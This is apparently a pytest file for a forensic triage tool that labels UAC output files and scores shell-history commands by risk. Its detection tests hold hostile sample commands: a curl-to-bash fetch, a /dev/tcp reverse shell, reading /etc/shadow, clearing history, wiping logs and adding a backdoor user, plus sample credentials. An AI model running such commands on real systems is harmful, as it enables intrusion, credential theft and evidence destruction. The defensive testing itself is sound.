"""Tests for flagging text files worth reading, and for the shell history parser.

Both come from one report: *"there were several txt files that were not parsed. While
this is ok, inspecthor should be able to flag txt files that may be of interest such as
auth logs"*, followed by *"critical files were not parsed such as the .bash_history …
this log was extremely important in seeing what commands the attacker ran"*.

Measured cause of the first: 1,326 of 1,331 ``.txt`` files in a UAC collection produced
one event each, described only by their line count — including a 753 KB ``lsof``
inventory of every open socket on the host.

Filenames here are the real ones from that collection. UAC names each output file after
the command that produced it, which makes the name a stronger signal than any header
sniff — and unlike column layouts, these were measured rather than recalled.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from inspecthor import textkind
from inspecthor.models import LEVEL_RANK, ParseContext
from inspecthor.parsers.plugins.shell_history import (
    ShellHistoryParser, classify as classify_command, read_history,
)

AUTH_SAMPLE = (
    "2025-12-29T05:07:41+00:00 h sshd[1]: Accepted password for ubuntu from "
    "119.73.124.129 port 1 ssh2\n"
    "2025-12-29T05:06:21+00:00 h sshd[2]: Invalid user admin from 111.36.147.188\n"
)


# ---- the ask: flag text files worth reading -----------------------------------


@pytest.mark.parametrize("name,expect", [
    ("utmpdump_var_log_wtmp.txt", "Login records"),
    ("lsof_-nPl.txt", "Open files and sockets"),
    ("ss_-anp.txt", "Network connections"),
    ("netstat_-anp.txt", "Network connections"),
    ("ps_aux.txt", "Process list"),
    ("dpkg_-l.txt", "Installed packages"),
    ("systemctl_list-timers_--all.txt", "Systemd timers"),
    ("iptables_-L.txt", "Firewall rules"),
    ("suid.txt", "SUID binaries"),
    ("world_writable_files.txt", "World-writable paths"),
    ("user_name_unknown_files.txt", "Files with no owning user"),
    ("getcap.txt", "File capabilities"),
    ("dmesg.txt", "Kernel ring buffer"),
])
def test_uac_command_output_is_named_from_its_filename(name, expect):
    """UAC names each file after the command it ran, so the name is the strong signal."""
    _kind, label, _sev, why = textkind.classify(name, "some content\n")
    assert expect in label, (name, label)
    assert why, f"{name} got no explanation of why it is worth reading"


def test_an_auth_log_is_recognised_by_content_whatever_its_name():
    """The case the report named. A copied log has no useful filename."""
    kind, label, severity, why = textkind.classify("notes.txt", AUTH_SAMPLE)
    assert kind == "auth"
    assert "Authentication records" in label
    assert severity == "info"
    assert "who got in" in why


def test_a_private_key_outranks_the_filename():
    sample = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n"
    kind, label, severity, _why = textkind.classify("ps_aux.txt", sample)
    assert kind == "credentials"
    assert "PRIVATE KEY" in label
    assert severity == "med"


@pytest.mark.parametrize("sample", [
    "AKIAIOSFODNN7EXAMPLE\n",
    "mongodb://admin:hunter2@10.0.0.9:27017/\n",
    "aws_secret_access_key = wJalrXUtnFEMI\n",
])
def test_embedded_credentials_are_flagged(sample):
    kind, _label, severity, _why = textkind.classify("config.txt", sample)
    assert kind == "credentials"
    assert severity == "med"


def test_classification_is_labelling_not_alerting():
    """Four rounds of false positives in this project came from treating the existence
    of a thing as evidence of wrongdoing. Only credentials rise above info."""
    for name in ("lsof_-nPl.txt", "ps_aux.txt", "dpkg_-l.txt", "suid.txt"):
        _kind, _label, severity, _why = textkind.classify(name, "x\n")
        assert severity == "info", name


def test_an_unrecognised_file_is_not_dressed_up():
    kind, label, _sev, why = textkind.classify("readme.txt", "hello world\n")
    assert kind == "" and label == "" and why == ""


def test_describe_never_returns_an_empty_title():
    for name, sample in (("lsof_-nPl.txt", "x"), ("mystery.bin", "x"), ("", "")):
        title, details, _sev, _why = textkind.describe(name, sample, 5)
        assert title.strip(), name
        assert details.strip(), name


def test_the_old_line_count_wording_is_still_the_fallback():
    """A row must never become less informative than it was."""
    title, details, _sev, _why = textkind.describe("mystery.txt", "zzz\n", 1834)
    assert "1,834" in details
    assert "searchable" in details


def test_a_timestamped_file_is_also_classified(tmp_path: Path):
    """The gap this closed: classification ran only on files with NO timestamps, so
    utmpdump output — 11 lines that ARE timestamped — produced rows titled 'Log line'
    despite being the login records an analyst most wants."""
    from inspecthor.parsers.plugins.generic_text import GenericText

    path = tmp_path / "utmpdump_var_log_wtmp.txt"
    path.write_text(
        "[7] [39962] [ts/0] [mongoadmin] [pts/0] [65.0.76.43] "
        "[2025-12-29T05:41:04,000000+00:00]\n"
        "[8] [39962] [    ] [        ] [pts/0] [          ] "
        "[2025-12-29T05:42:04,000000+00:00]\n",
        encoding="utf-8",
    )
    events = list(GenericText().parse(path, ParseContext(evidence_root=tmp_path)))
    assert events, "timestamped lines must still become events"
    assert all("Login records" in e.title for e in events), [e.title for e in events]
    assert any("65.0.76.43" in (e.details or "") for e in events)
    assert all("worth_reading" in e.tags for e in events)


def test_a_short_file_is_still_classified(tmp_path: Path):
    """The first attempt only classified after 40 lines, so an 11-line utmpdump never
    would have been."""
    from inspecthor.parsers.plugins.generic_text import GenericText

    path = tmp_path / "ss_-anp.txt"
    path.write_text("Netid State Recv-Q Send-Q Local Address:Port\n", encoding="utf-8")
    events = list(GenericText().parse(path, ParseContext(evidence_root=tmp_path)))
    assert events and "Network connections" in events[0].title


def test_generic_text_puts_the_classification_in_the_event(tmp_path: Path):
    from inspecthor.parsers.plugins.generic_text import GenericText

    path = tmp_path / "lsof_-nPl.txt"
    path.write_text("COMMAND PID USER FD TYPE DEVICE NODE NAME\nmongod 1931 mongodb 11u IPv4 x TCP *:27017\n",
                    encoding="utf-8")
    events = list(GenericText().parse(path, ParseContext(evidence_root=tmp_path)))
    assert len(events) == 1
    assert "Open files and sockets" in events[0].title
    assert events[0].data.get("why")
    assert "worth_reading" in events[0].tags
    # And the content is still searchable, which was never the broken part.
    assert "27017" in (events[0].raw or "")


# ---- shell history ------------------------------------------------------------


def test_plain_bash_history_keeps_order(tmp_path: Path):
    path = tmp_path / "home" / "mongoadmin" / ".bash_history"
    path.parent.mkdir(parents=True)
    path.write_text("whoami\nmongosh --host 127.0.0.1\nmongodump --out /tmp/x\n",
                    encoding="utf-8")
    events = list(ShellHistoryParser().parse(path, ParseContext(evidence_root=tmp_path)))
    assert [e.data["command"] for e in events] == [
        "whoami", "mongosh --host 127.0.0.1", "mongodump --out /tmp/x",
    ]
    assert [e.data["line"] for e in events] == [1, 2, 3]
    # Order must survive into the timeline even with no timestamps in the file.
    assert [e.timestamp for e in events] == sorted(e.timestamp for e in events)
    assert all(e.user == "mongoadmin" for e in events)


def test_bash_histtimeformat_timestamps_are_used():
    entries = read_history(["#1766986864", "mongodump --out /tmp/x", "#1766986900",
                            "history -c"])
    assert len(entries) == 2
    assert entries[0][1] is not None and entries[0][1].year == 2025
    assert entries[0][2] == "mongodump --out /tmp/x"
    assert entries[1][2] == "history -c"


def test_zsh_extended_history_is_parsed():
    entries = read_history([": 1766986864:0;mongodump --out /tmp/x",
                            ": 1766986900:2;rm -rf /var/log"])
    assert [e[2] for e in entries] == ["mongodump --out /tmp/x", "rm -rf /var/log"]
    assert all(e[1] is not None for e in entries)


@pytest.mark.parametrize("command,floor", [
    ("curl http://198.51.100.9/x.sh | bash", "high"),
    ("bash -i >& /dev/tcp/198.51.100.9/4444 0>&1", "high"),
    ("mongodump --host 10.0.0.9 --out /tmp/loot", "high"),
    ("cat /etc/shadow", "high"),
    ("history -c", "high"),
    ("chmod +s /tmp/sh", "high"),
    ("useradd -m backdoor", "med"),
    ("crontab -e", "med"),
    ("mongosh --host 127.0.0.1", "med"),
    ("whoami", "low"),
    ("ss -tulpn", "low"),
])
def test_commands_are_scored_by_what_they_do(command, floor):
    severity, label, _attck, _why = classify_command(command)
    assert LEVEL_RANK[severity] >= LEVEL_RANK[floor], (command, severity, label)


@pytest.mark.parametrize("command", ["ls", "cd /tmp", "exit", "clear", "vim notes.txt"])
def test_ordinary_commands_are_not_findings(command):
    severity, _label, _attck, _why = classify_command(command)
    assert severity == "info", command


def test_the_history_file_itself_is_not_the_finding(tmp_path: Path):
    """A history full of ls and cd must produce nothing above info."""
    path = tmp_path / "home" / "ubuntu" / ".bash_history"
    path.parent.mkdir(parents=True)
    path.write_text("ls\ncd /var/log\nexit\n", encoding="utf-8")
    events = list(ShellHistoryParser().parse(path, ParseContext(evidence_root=tmp_path)))
    assert events and all(e.severity == "info" for e in events)


def test_untimed_history_says_the_clock_is_not_real(tmp_path: Path):
    path = tmp_path / "home" / "x" / ".bash_history"
    path.parent.mkdir(parents=True)
    path.write_text("whoami\nid\n", encoding="utf-8")
    ctx = ParseContext(evidence_root=tmp_path)
    events = list(ShellHistoryParser().parse(path, ctx))
    assert all("not the run time" in e.timestamp_desc for e in events)
    assert any("HISTTIMEFORMAT" in h for h in ctx.hints), ctx.hints


@pytest.mark.parametrize("name", [
    ".bash_history", ".zsh_history", ".mysql_history", ".psql_history", ".dbshell",
    ".python_history", "mongosh_repl_history",
])
def test_every_history_flavour_is_claimed(tmp_path: Path, name):
    path = tmp_path / name
    path.write_text("show dbs\n", encoding="utf-8")
    assert ShellHistoryParser().sniff(path, path.read_bytes()) > 0.0


def test_root_history_owner_is_root(tmp_path: Path):
    path = tmp_path / "root" / ".bash_history"
    path.parent.mkdir(parents=True)
    path.write_text("id\n", encoding="utf-8")
    events = list(ShellHistoryParser().parse(path, ParseContext(evidence_root=tmp_path)))
    assert events and events[0].user == "root"


def test_the_command_is_searchable(tmp_path: Path):
    """The regression that started this: content has to reach the FTS index."""
    path = tmp_path / "home" / "mongoadmin" / ".bash_history"
    path.parent.mkdir(parents=True)
    path.write_text("mongodump --out /tmp/loot\n", encoding="utf-8")
    events = list(ShellHistoryParser().parse(path, ParseContext(evidence_root=tmp_path)))
    assert any("mongodump" in (e.raw or "") for e in events)
    assert any("mongodump" in (e.details or "") for e in events)
